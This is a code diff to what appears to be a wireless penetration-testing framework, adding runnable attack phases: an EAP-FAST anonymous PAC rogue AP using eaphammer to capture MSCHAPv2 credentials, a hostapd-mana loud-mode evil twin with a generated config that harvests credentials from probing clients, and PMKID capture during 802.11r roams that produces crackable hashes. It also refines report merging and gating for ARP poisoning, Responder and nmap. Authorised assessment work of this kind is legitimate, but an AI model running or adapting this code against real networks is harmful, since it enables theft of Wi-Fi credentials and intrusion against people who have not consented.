@@ -55,7 +55,7 @@ import struct
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-VERSION = "1.17.0"
+VERSION = "1.20.0"
 
 
 def _clients_base() -> Path:
@@ -286,11 +286,17 @@ def finding_from_cat(cat_id: str, data: dict | None = None,
 _AETHER_MERGE_KEYS = {
     # Inventory: collapse per-AP findings into one per SSID
     "AETHER-INFO-AP":         lambda d: ("ssid",   d.get("ssid", "")),
-    "AETHER-INFO-AUTH-TYPE":  lambda d: ("ssid",   d.get("ssid", "")),
+    # Auth types: collapse only when every detail matches EXCEPT the BSSID, so
+    # two APs that share an SSID but differ in auth/encryption stay separate.
+    "AETHER-INFO-AUTH-TYPE":  lambda d: ("auth_signature", "|".join([
+                                  d.get("ssid", ""), d.get("auth_type", ""),
+                                  d.get("encryption_raw", ""), d.get("auth_raw", "")])),
     "AETHER-INFO-CHANNEL":    lambda d: ("ssid",   d.get("ssid", "")),
     "AETHER-INFO-VENDOR":     lambda d: ("vendor", d.get("vendor", "")),
-    # Client observations: collapse per-client findings into one per BSSID
-    "AETHER-INFO-CLIENT":     lambda d: ("bssid",  d.get("associated_bssid", "")),
+    # Client observations: collapse per-client findings into one per (SSID, BSSID)
+    "AETHER-INFO-CLIENT":     lambda d: ("ssid+bssid", "|".join([
+                                  d.get("associated_ssid", ""),
+                                  d.get("associated_bssid", "")])),
     "AETHER-INFO-PROBE":      lambda d: ("bssid",  d.get("seen_on_bssid", "")),
     # PMF / BTM: collapse per-attack-attempt findings into one per BSSID
     "AETHER-022":             lambda d: ("bssid",  d.get("bssid", "")),  # pmf_not_enforced
@@ -303,17 +309,21 @@ _AETHER_MERGE_KEYS = {
 # replaced with this so consumers see one descriptive heading per group
 # instead of N variant titles (e.g. one per client MAC).  Empty here means
 # keep the first record's title as-is.
+#
+# Each lambda receives the first contributing record's `data` dict so titles
+# can be built from multiple fields (e.g. auth-type groups keyed on a composite
+# signature still render a human-readable SSID + auth-type heading).
 _AETHER_MERGED_TITLES = {
-    "AETHER-INFO-AP":         lambda k: f"Wireless Access Points Observed on SSID: {k}",
-    "AETHER-INFO-AUTH-TYPE":  lambda k: f"Authentication Type Classified for SSID: {k}",
-    "AETHER-INFO-CHANNEL":    lambda k: f"Channel Allocations Observed for SSID: {k}",
-    "AETHER-INFO-VENDOR":     lambda k: f"Wireless Vendor Identified: {k}",
-    "AETHER-INFO-CLIENT":     lambda k: f"Client Devices Observed on BSSID: {k}",
-    "AETHER-INFO-PROBE":      lambda k: f"Client Probe Requests Observed on BSSID: {k}",
-    "AETHER-022":             lambda k: f"PMF Not Required: Management Frames Unprotected on BSSID {k}",
-    "AETHER-023":             lambda k: f"BSS Transition Management Hijack Successful on BSSID {k}",
-    "pmf_not_enforced":       lambda k: f"PMF Not Required: Management Frames Unprotected on BSSID {k}",
-    "btm_hijack":             lambda k: f"BSS Transition Management Hijack Successful on BSSID {k}",
+    "AETHER-INFO-AP":         lambda d: f"Wireless Access Points Observed on SSID: {d.get('ssid','')}",
+    "AETHER-INFO-AUTH-TYPE":  lambda d: f"Authentication Type Classified: {d.get('auth_type','')} (SSID: {d.get('ssid','')})",
+    "AETHER-INFO-CHANNEL":    lambda d: f"Channel Allocations Observed on SSID: {d.get('ssid','')}",
+    "AETHER-INFO-VENDOR":     lambda d: f"Wireless Vendor Identified: {d.get('vendor','')}",
+    "AETHER-INFO-CLIENT":     lambda d: f"Client Devices Observed on SSID: {d.get('associated_ssid','')} BSSID: {d.get('associated_bssid','')}",
+    "AETHER-INFO-PROBE":      lambda d: f"Client Probe Requests Observed on BSSID: {d.get('seen_on_bssid','')}",
+    "AETHER-022":             lambda d: f"PMF Not Required: Management Frames Unprotected on BSSID {d.get('bssid','')}",
+    "AETHER-023":             lambda d: f"BSS Transition Management Hijack Successful on BSSID {d.get('bssid','')}",
+    "pmf_not_enforced":       lambda d: f"PMF Not Required: Management Frames Unprotected on BSSID {d.get('bssid','')}",
+    "btm_hijack":             lambda d: f"BSS Transition Management Hijack Successful on BSSID {d.get('bssid','')}",
 }
 
 
@@ -339,7 +349,7 @@ def _merge_native_findings(records: list) -> list:
                 # Replace per-record title with the group title so the
                 # consumer sees one heading per (catalogue_id, group key)
                 if cat_id in _AETHER_MERGED_TITLES and key_val:
-                    new_rec["title"] = _AETHER_MERGED_TITLES[cat_id](key_val)
+                    new_rec["title"] = _AETHER_MERGED_TITLES[cat_id](data)
                 new_rec["data"] = {
                     **{k: v for k, v in data.items() if k != "merged_records"},
                     "merged_records": [data],
@@ -394,10 +404,39 @@ def _u_synthesize_outputs(output_dir: Path, native_findings: list) -> None:
             #                           that BSSID (Client/Probe/PMF/BTM groups)
             merged_records = data.get("merged_records") if isinstance(data, dict) else None
             merge_key_field = data.get("merge_key_field", "") if isinstance(data, dict) else ""
+            cat_id_m = data.get("catalogue_id", "") if isinstance(data, dict) else ""
             if merged_records:
                 aff_items: list[str] = []
-                if merge_key_field == "ssid":
-                    # Group is per-SSID → list BSSIDs (+ channel + vendor when present)
+                if cat_id_m in ("AETHER-INFO-AP", "AETHER-INFO-AUTH-TYPE"):
+                    # Per-SSID (AP) / per-auth-signature group → list BSSIDs only.
+                    # Column BSSID is blanked since the group spans many BSSIDs.
+                    for mr in merged_records:
+                        if not isinstance(mr, dict): continue
+                        _b = mr.get("bssid") or mr.get("BSSID") or ""
+                        if _b: aff_items.append(_b)
+                    bssid = ""
+                elif cat_id_m == "AETHER-INFO-CHANNEL":
+                    # Per-SSID group → list BSSID/channel combinations.
+                    for mr in merged_records:
+                        if not isinstance(mr, dict): continue
+                        _b  = mr.get("bssid") or mr.get("BSSID") or ""
+                        _c  = mr.get("channel") or mr.get("ch") or ""
+                        piece = " ".join(p for p in (_b, f"ch{_c}" if _c != "" else "") if p)
+                        if piece: aff_items.append(piece)
+                    bssid = ""
+                elif cat_id_m == "AETHER-INFO-CLIENT":
+                    # Per-(SSID, BSSID) group → list client device MACs.  The
+                    # group is BSSID-identified, so surface the shared SSID/BSSID
+                    # (client records store these as associated_ssid/_bssid).
+                    for mr in merged_records:
+                        if not isinstance(mr, dict): continue
+                        cmac = (mr.get("mac") or mr.get("client_mac")
+                                or mr.get("client") or "")
+                        if cmac: aff_items.append(cmac)
+                    ssid  = data.get("associated_ssid") or ssid
+                    bssid = data.get("associated_bssid") or bssid
+                elif merge_key_field == "ssid":
+                    # Generic per-SSID group → list BSSIDs (+ channel + vendor when present)
                     for mr in merged_records:
                         if not isinstance(mr, dict): continue
                         _bssid_m = mr.get("bssid") or mr.get("BSSID") or ""
@@ -408,6 +447,7 @@ def _u_synthesize_outputs(output_dir: Path, native_findings: list) -> None:
                                               f"ch{_ch_m}" if _ch_m else "",
                                               _auth_m, _ven_m) if p]
                         if pieces: aff_items.append(" ".join(pieces))
+                    bssid = ""
                 elif merge_key_field == "bssid":
                     # Group is per-BSSID → list client MACs (+ vendor when known).
                     # Different catalogue_ids store the MAC in different keys —
@@ -4118,6 +4158,291 @@ def phase_eap_downgrade(monitor_iface: str, target_aps: list,
     status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "complete")
 
 
+# ── Phase 8b: EAP-FAST Anonymous PAC Provisioning ─────────────────────────────
+# 2026-06-11 review round 5: explicit EAP-FAST attack that exploits
+# anonymous in-band PAC provisioning (RFC 4851 §3.4) which still ships
+# enabled on many corporate WPA-Enterprise SSIDs.  In anonymous mode,
+# the supplicant accepts a PAC from any AP without server-cert
+# validation, allowing MITM credential capture.  We run eaphammer in
+# EAP-FAST-only mode with --auto-pac which provisions a fresh PAC to
+# every connecting station then captures the inner MSCHAPv2 exchange.
+
+def phase_eap_fast_anon(monitor_iface: str, target_aps: list,
+                         eaphammer_path: str, output_dir: Path,
+                         timeout: int) -> None:
+    status("p8b_eap_fast", "Phase 8b: EAP-FAST Anonymous PAC Provisioning", "running")
+
+    enterprise_aps = [
+        ap for ap in target_aps
+        if re.search(r"MGT|EAP|Enterprise|802\.1[Xx]",
+                     (ap.get("auth") or "") + " " + (ap.get("encryption") or ""), re.I)
+    ]
+    if not enterprise_aps:
+        log("Phase 8b: No WPA-Enterprise APs in scope — skipping EAP-FAST attack.")
+        status("p8b_eap_fast", "Phase 8b: EAP-FAST Anonymous PAC Provisioning", "skipped")
+        return
+
+    ep_path = Path(eaphammer_path) if Path(eaphammer_path).exists() else Path(
+        shutil.which("eaphammer") or "/opt/eaphammer/eaphammer"
+    )
+    if not ep_path.exists():
+        log("Phase 8b: eaphammer not found — skipping EAP-FAST attack.")
+        status("p8b_eap_fast", "Phase 8b: EAP-FAST Anonymous PAC Provisioning", "skipped")
+        return
+
+    ef_dir = output_dir / "eap_fast_anon"
+    ef_dir.mkdir(exist_ok=True)
+
+    for ap in enterprise_aps:
+        ssid    = ap.get("ssid", "")
+        bssid   = ap.get("bssid", "")
+        channel = int(ap.get("channel") or 6)
+        log(f"Phase 8b: EAP-FAST anonymous PAC against {ssid!r} [{bssid}]")
+        cred_file = ef_dir / f"creds_{bssid.replace(':','')}.txt"
+        cmd = [
+            str(ep_path), "--interface", monitor_iface,
+            "--essid", ssid, "--channel", str(channel),
+            "--auth", "wpa-eap",
+            "--creds",
+            "--negotiate", "manual",
+            "--phase-1-methods", "FAST",          # EAP-FAST only
+            "--phase-2-methods", "MSCHAPV2",      # inner method
+            "--auto-pac",                          # anonymous PAC provisioning
+        ]
+        if bssid:
+            cmd += ["--bssid", bssid]
+        try:
+            out, rc = _run(cmd, timeout=min(timeout, 180))
+            (ef_dir / f"eaphammer_{bssid.replace(':','')}.log").write_text(
+                out, encoding="utf-8"
+            )
+            cred_lines = [l for l in out.splitlines()
+                          if re.search(r"username|password|mschapv2|pac|credential", l, re.I)]
+            if cred_lines:
+                cred_file.write_text("\n".join(cred_lines), encoding="utf-8")
+                finding_from_cat(
+                    "eap_fast_anon_pac",
+                    data={"ssid": ssid, "bssid": bssid,
+                          "credentials_raw": "\n".join(cred_lines[:20]),
+                          "attack": "EAP-FAST anonymous PAC"},
+                    output_file=str(cred_file),
+                    title_override=f"EAP-FAST Anonymous PAC: Credentials Captured from {ssid}",
+                )
+                log(f"Phase 8b: EAP-FAST credentials captured for {ssid!r}")
+            else:
+                log(f"Phase 8b: No credentials captured from {ssid!r}")
+        except Exception as exc:
+            err(f"Phase 8b: eaphammer EAP-FAST error for {ssid!r}: {exc}")
+
+    status("p8b_eap_fast", "Phase 8b: EAP-FAST Anonymous PAC Provisioning", "complete")
+
+
+# ── Phase 6c: MANA Loud Mode (full known-beacon spam) ─────────────────────────
+# 2026-06-11 review round 5: distinct from KARMA (phase 6b) which only
+# answers probe requests with a single SSID.  MANA loud mode replays
+# every known-beacon SSID the station has previously associated with,
+# dramatically increasing connect probability for unconfigured clients
+# (corporate laptops with Auto-Connect SSID list still populated, etc.).
+
+def phase_mana_loud(monitor_iface: str, primary_iface: str,
+                     output_dir: Path, rogue_cfg: dict, timeout: int) -> None:
+    status("p6c_mana_loud", "Phase 6c: MANA Loud Mode", "running")
+
+    if not shutil.which("hostapd-mana"):
+        log("Phase 6c: hostapd-mana not installed — skipping MANA loud mode.")
+        status("p6c_mana_loud", "Phase 6c: MANA Loud Mode", "skipped")
+        return
+
+    mana_dir = output_dir / "mana_loud"
+    mana_dir.mkdir(exist_ok=True)
+    conf_file = mana_dir / "hostapd_mana.conf"
+    log_file  = mana_dir / "hostapd_mana.log"
+    creds_file = mana_dir / "captured_creds.txt"
+
+    conf = (
+        f"interface={monitor_iface}\n"
+        f"driver=nl80211\n"
+        f"ssid=__MANA__\n"
+        f"hw_mode=g\n"
+        f"channel=1\n"
+        # MANA loud mode — see hostapd-mana README
+        f"mana_wpaout={log_file}\n"
+        f"mana_loud=1\n"
+        f"mana_macacl=0\n"
+        f"mana_eap_success=1\n"
+        f"ieee8021x=1\n"
+        f"eap_server=1\n"
+        f"eap_user_file={mana_dir / 'eap_users'}\n"
+    )
+    conf_file.write_text(conf, encoding="utf-8")
+    (mana_dir / "eap_users").write_text(
+        '* PEAP\n"anonymous" MSCHAPV2 "password" [2]\n',
+        encoding="utf-8",
+    )
+
+    log(f"Phase 6c: starting hostapd-mana on {monitor_iface} (loud mode)")
+    proc = None
+    try:
+        proc = _popen(
+            ["sudo", "hostapd-mana", str(conf_file)],
+            stdout=open(log_file, "a"),
+            stderr=subprocess.STDOUT,
+        )
+        time.sleep(min(timeout, 180))
+    except Exception as exc:
+        err(f"Phase 6c: hostapd-mana error: {exc}")
+    finally:
+        if proc is not None:
+            _kill_proc(proc)
+
+    if log_file.exists() and log_file.stat().st_size > 0:
+        txt = log_file.read_text(encoding="utf-8", errors="replace")
+        cred_lines = [l for l in txt.splitlines()
+                      if re.search(r"identity|username|mschapv2|hash|password", l, re.I)]
+        ssids_seen = sorted(set(
+            re.findall(r"PROBE-REQ.*'([^']+)'", txt)
+        ))
+        if cred_lines:
+            creds_file.write_text("\n".join(cred_lines), encoding="utf-8")
+            finding_from_cat(
+                "mana_loud_creds",
+                data={"credentials_raw": "\n".join(cred_lines[:30]),
+                      "probed_ssids": ssids_seen[:50],
+                      "attack": "MANA loud mode"},
+                output_file=str(creds_file),
+                title_override="MANA Loud Mode: Credentials Captured from Probing Stations",
+            )
+            log(f"Phase 6c: MANA captured {len(cred_lines)} credential line(s)")
+        elif ssids_seen:
+            finding_from_cat(
+                "mana_loud_probe_leak",
+                data={"probed_ssids": ssids_seen[:50],
+                      "attack": "MANA loud mode (probe collection)"},
+                output_file=str(log_file),
+                title_override=("MANA Loud Mode: Stations Probing for "
+                                f"{len(ssids_seen)} Known SSID(s)"),
+            )
+            log(f"Phase 6c: MANA observed {len(ssids_seen)} probed SSID(s) (no creds)")
+        else:
+            log("Phase 6c: MANA collected no probes or credentials")
+
+    status("p6c_mana_loud", "Phase 6c: MANA Loud Mode", "complete")
+
+
+# ── Phase 1c: PMKID Roam Capture (802.11r FT events) ──────────────────────────
+# 2026-06-11 review round 5: complements phase_pmkid (which captures the
+# initial association PMKID).  When 802.11r Fast Transition is enabled,
+# every roam re-broadcasts a fresh PMKID against the new AP.  Stations
+# moving between APs during the timeout window produce additional PMKIDs
+# that the original capture misses.  Same toolchain (hcxdumptool +
+# hcxpcapngtool), but we run for the full timeout without per-target
+# filtering so every BSSID in the ESS is recorded.
+
+def phase_pmkid_roam(monitor_iface: str, target_aps: list,
+                      output_dir: Path, timeout: int = 300,
+                      wordlist: str | None = None,
+                      hashcat_rules: list | None = None) -> None:
+    if not shutil.which("hcxdumptool") or not shutil.which("hcxpcapngtool"):
+        status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "skipped",
+               "hcxdumptool / hcxpcapngtool not installed")
+        return
+
+    scoped_aps = [ap for ap in target_aps if _in_scope(ap)]
+    if not scoped_aps:
+        status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "skipped", "no targets")
+        return
+
+    # Group by SSID — roam events happen WITHIN an ESS (same SSID, different BSSIDs)
+    ess_groups: dict[str, list[str]] = {}
+    for ap in scoped_aps:
+        ssid  = ap.get("ssid", "")
+        bssid = ap.get("bssid", "")
+        if ssid and bssid:
+            ess_groups.setdefault(ssid, []).append(bssid)
+    # Only ESSs with 2+ BSSIDs can roam
+    multi_ap = {k: v for k, v in ess_groups.items() if len(v) > 1}
+    if not multi_ap:
+        log("Phase 1c: No multi-AP ESSs in scope — roam capture would have no effect.")
+        status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "skipped",
+               "no multi-AP ESSs")
+        return
+
+    status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "running")
+    roam_dir = output_dir / "pmkid_roam"
+    roam_dir.mkdir(parents=True, exist_ok=True)
+
+    # All scoped BSSIDs across all ESSs — capture everything that could roam.
+    all_bssids = [b for bssids in multi_ap.values() for b in bssids]
+    bssid_filter = roam_dir / "bssids.txt"
+    bssid_filter.write_text("\n".join(all_bssids) + "\n", encoding="utf-8")
+
+    pcapng_file = roam_dir / "roam_capture.pcapng"
+    cmd = [
+        "sudo", "hcxdumptool",
+        "-i", monitor_iface,
+        "-w", str(pcapng_file),
+        "--rds=1",
+        f"--filterlist_ap={bssid_filter}",
+        "--filtermode=2",
+        # Aggressive M1 retransmit to trigger roams + capture FT PMKIDs
+        "--rcascan=active",
+    ]
+
+    log(f"[1c] hcxdumptool: roam capture ({timeout}s, "
+        f"{len(multi_ap)} multi-AP ESS, {len(all_bssids)} BSSID)")
+    proc = None
+    try:
+        proc = _popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(timeout)
+    except Exception:
+        pass
+    finally:
+        if proc is not None:
+            _kill_proc(proc)
+
+    if not pcapng_file.exists() or pcapng_file.stat().st_size == 0:
+        log("[1c] hcxdumptool: no roam capture data collected")
+        status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "complete")
+        return
+
+    hc22000_file = roam_dir / "roam_hashes.hc22000"
+    conv_out, _ = _run([
+        "hcxpcapngtool", "-o", str(hc22000_file), str(pcapng_file),
+    ], timeout=60)
+    log(conv_out.strip())
+
+    if not hc22000_file.exists() or hc22000_file.stat().st_size == 0:
+        log("[1c] hcxpcapngtool: no roam-event PMKIDs extracted")
+        status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "complete")
+        return
+
+    hash_lines = [l for l in hc22000_file.read_text(encoding="utf-8").splitlines() if l.strip()]
+    log(f"[1c] Extracted {len(hash_lines)} roam-event PMKID/EAPOL hash(es)")
+    # One finding per (SSID, BSSID) — roam events are per-BSSID
+    seen: set[tuple[str, str]] = set()
+    for hl in hash_lines:
+        parts = hl.split("*")
+        if len(parts) >= 4:
+            try:
+                ssid_from_hash = bytes.fromhex(parts[3]).decode("utf-8", errors="replace")
+            except Exception:
+                ssid_from_hash = ""
+            bssid_hex = parts[1] if len(parts) > 1 else ""
+            key = (ssid_from_hash, bssid_hex)
+            if ssid_from_hash and key not in seen:
+                seen.add(key)
+                finding_from_cat(
+                    "pmkid_roam_capture",
+                    data={"ssid": ssid_from_hash, "bssid_hex": bssid_hex,
+                          "ess_aps": multi_ap.get(ssid_from_hash, []),
+                          "hash_file": str(hc22000_file)},
+                    output_file=str(hc22000_file),
+                    title_override=f"PMKID Captured from FT Roam Event: {ssid_from_hash}",
+                )
+
+    status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "complete")
+
+
 # ── Phase 9: SAE Transition Mode Downgrade ────────────────────────────────────
 
 def phase_sae_downgrade(monitor_iface: str, primary_iface: str,
@@ -4298,6 +4623,29 @@ def _detect_local_range(ap_iface: str) -> str:
     return _CAPTIVE_CIDR
 
 
+def _iface_connection_state(iface: str) -> "tuple[bool, str, str]":
+    """Confirm `iface` is actually on a network before post-connection attacks
+    run.  Returns (connected, ip, ssid).
+
+    `connected` is True only when the interface carries an IPv4 address — the
+    interface is either associated as a station (DHCP-leased) or hosting the
+    rogue AP (assigned _CAPTIVE_IP).  No IPv4 means the radio isn't on any
+    network, so ARP poisoning / Responder / internal nmap would fire into the
+    void.  `ssid` is the associated ESSID when the interface is a station
+    (parsed from `iw dev <iface> link`), or "" in AP mode / when unavailable."""
+    ip = _get_iface_ip(iface) or ""
+    ssid = ""
+    try:
+        out, rc = _run(["iw", "dev", iface, "link"], timeout=5)
+        if rc == 0 and out:
+            m = re.search(r"SSID:\s*(.+)", out)
+            if m:
+                ssid = m.group(1).strip()
+    except Exception:
+        pass
+    return (bool(ip), ip, ssid)
+
+
 def phase_post_connection(ap_iface: str, output_dir: Path,
                            post_cfg: dict, timeout: int) -> None:
     status("p10_post", "Phase 10: Post-Connection Attacks", "running")
@@ -4306,6 +4654,16 @@ def phase_post_connection(ap_iface: str, output_dir: Path,
         log("Phase 10: No AP interface configured — skipping post-connection attacks.")
         status("p10_post", "Phase 10: Post-Connection Attacks", "skipped")
         return
+
+    connected, iface_ip, assoc_ssid = _iface_connection_state(ap_iface)
+    if not connected:
+        log(f"Phase 10: {ap_iface} has no IPv4 address — interface is not "
+            f"associated/connected to any network. Skipping post-connection "
+            f"attacks (nothing to attack).")
+        status("p10_post", "Phase 10: Post-Connection Attacks", "skipped")
+        return
+    log(f"Phase 10: Connection confirmed on {ap_iface} (ip={iface_ip}"
+        + (f", ssid={assoc_ssid!r}" if assoc_ssid else "") + ")")
 
     pc_dir = output_dir / "post_connection"
     pc_dir.mkdir(exist_ok=True)
@@ -4381,7 +4739,9 @@ def phase_post_connection(ap_iface: str, output_dir: Path,
         status("p10_arp", "Phase 10a: ARP Poisoning / MITM", "complete")
 
     # ── 10b: LLMNR / NBT-NS / mDNS Poisoning ─────────────────────────────────
-    if post_cfg.get("llmnr_poison", True):
+    if post_cfg.get("llmnr_poison", True) and not clients:
+        log("Phase 10b: No connected clients — skipping LLMNR/NBT-NS poisoning.")
+    elif post_cfg.get("llmnr_poison", True):
         status("p10_llmnr", "Phase 10b: LLMNR / NBT-NS Poisoning", "running")
         responder_bin = (
             shutil.which("responder") or
@@ -4439,7 +4799,9 @@ def phase_post_connection(ap_iface: str, output_dir: Path,
         status("p10_llmnr", "Phase 10b: LLMNR / NBT-NS Poisoning", "complete")
 
     # ── 10c: Internal Network Port Scan ───────────────────────────────────────
-    if post_cfg.get("port_scan", True):
+    if post_cfg.get("port_scan", True) and not clients:
+        log("Phase 10c: No connected clients — skipping internal network port scan.")
+    elif post_cfg.get("port_scan", True):
         status("p10_portscan", "Phase 10c: Internal Network Port Scan", "running")
         if not shutil.which("nmap"):
             log("Phase 10c: nmap not installed — skipping port scan.")
@@ -4940,6 +5302,12 @@ def run(config: dict, project: str) -> None:
                         timeout=min(timeout, 120), wordlist=_effective_wl,
                         hashcat_rules=hashcat_rules)
 
+        if phases_cfg.get("pmkid_roam", False):
+            phase_pmkid_roam(active_monitor, target_aps, output_dir,
+                              timeout=min(timeout, 300),
+                              wordlist=_effective_wl,
+                              hashcat_rules=hashcat_rules)
+
         if phases_cfg.get("wpa_handshake", True):
             phase_wifite(
                 active_monitor, target_ssids, effective_bssids,
@@ -4996,6 +5364,11 @@ def run(config: dict, project: str) -> None:
                 active_monitor, interface, output_dir, rogue_cfg, timeout,
             )
 
+        if phases_cfg.get("mana_loud", False):
+            phase_mana_loud(
+                active_monitor, interface, output_dir, rogue_cfg, timeout,
+            )
+
         if phases_cfg.get("client_attacks", True):
             phase_client_attacks(
                 active_monitor, target_aps, enriched_aps, output_dir, timeout,
@@ -5003,6 +5376,13 @@ def run(config: dict, project: str) -> None:
 
         if phases_cfg.get("eap_downgrade", False):
             phase_eap_downgrade(
+                active_monitor, target_aps,
+                tools.get("eaphammer", "/opt/eaphammer/eaphammer"),
+                output_dir, timeout,
+            )
+
+        if phases_cfg.get("eap_fast_anon", False):
+            phase_eap_fast_anon(
                 active_monitor, target_aps,
                 tools.get("eaphammer", "/opt/eaphammer/eaphammer"),
                 output_dir, timeout,
@@ -5300,11 +5680,13 @@ def phase_contextual_intel(enriched_aps: list, output_dir: Path) -> None:
         # merge step in save_findings() collapses them into a single
         # Informational entry per category with all APs in the affected list.
         finding_from_cat("AETHER-INFO-AP", data=ap_data,
+                         output_file=str(ctx_dir / "inventory.json"),
                          title_override="Wireless Access Points Observed (Inventory)")
 
         finding_from_cat("AETHER-INFO-AUTH-TYPE",
                          data={"bssid": bssid, "ssid": ssid, "auth_type": auth_type,
                                "encryption_raw": enc, "auth_raw": auth},
+                         output_file=str(ctx_dir / "inventory.json"),
                          title_override="Authentication Types Classified (Inventory)")
 
         if vendor != "Unknown":
@@ -5314,6 +5696,7 @@ def phase_contextual_intel(enriched_aps: list, output_dir: Path) -> None:
 
         finding_from_cat("AETHER-INFO-CHANNEL",
                          data={"bssid": bssid, "ssid": ssid, "channel": ch},
+                         output_file=str(ctx_dir / "inventory.json"),
                          title_override="Channel Allocations Observed (Inventory)")
 
         # Per-client catalog within this AP
@@ -5330,7 +5713,8 @@ def phase_contextual_intel(enriched_aps: list, output_dir: Path) -> None:
             # group title and lists each MAC in affected[].
             finding_from_cat("AETHER-INFO-CLIENT",
                              data={"mac": cmac, "vendor": cvendor,
-                                   "associated_bssid": bssid, "associated_ssid": ssid})
+                                   "associated_bssid": bssid, "associated_ssid": ssid},
+                             output_file=str(ctx_dir / "inventory.json"))
             for p in probes:
                 inventory["probes"].add(p)
                 finding_from_cat("AETHER-INFO-PROBE",
@@ -6054,6 +6438,9 @@ def main():
         print("  krack         — Phase 5:  WPA2 KRACK testing                 (krackattacks)")
         print("  rogue         — Phase 6a: Rogue AP / Evil Twin + PSK portal   (hostapd+dnsmasq)")
         print("  karma         — Phase 6b: KARMA / MANA probe response         (hostapd-mana)")
+        print("  mana-loud     — Phase 6c: MANA loud-mode beacon spam          (hostapd-mana)")
+        print("  pmkid-roam    — Phase 1c: PMKID capture during FT roam events (hcxdumptool)")
+        print("  eap-fast      — Phase 8b: EAP-FAST anonymous PAC provisioning (EAPHammer)")
         print("  client        — Phase 7:  PMF test + BTM hijack + probe harvest(scapy)")
         print("  eap-downgrade — Phase 8:  EAP downgrade credential capture    (EAPHammer)")
         print("  sae-downgrade — Phase 9:  SAE transition mode downgrade       (hostapd)")
@@ -6150,6 +6537,9 @@ def main():
             "krack":          "krack",
             "rogue":          "rogue_ap",
             "karma":          "karma",
+            "mana-loud":      "mana_loud",
+            "pmkid-roam":     "pmkid_roam",
+            "eap-fast":       "eap_fast_anon",
             "client":         "client_attacks",
             "eap-downgrade":  "eap_downgrade",
             "sae-downgrade":  "sae_downgrade",
@@ -6157,10 +6547,10 @@ def main():
             "legacy":         "legacy_attacks",
         }
         _all_keys = [
-            "wep", "pmkid", "wpa_handshake", "wpa_enterprise",
+            "wep", "pmkid", "pmkid_roam", "wpa_handshake", "wpa_enterprise",
             "dragonblood_sae", "dragonblood_drain", "krack",
-            "rogue_ap", "karma", "client_attacks", "eap_downgrade",
-            "sae_downgrade", "post_connection", "legacy_attacks",
+            "rogue_ap", "karma", "mana_loud", "client_attacks", "eap_downgrade",
+            "eap_fast_anon", "sae_downgrade", "post_connection", "legacy_attacks",
         ]
         config["phases"] = {k: (k == _phase_map[args.phase]) for k in _all_keys}
 
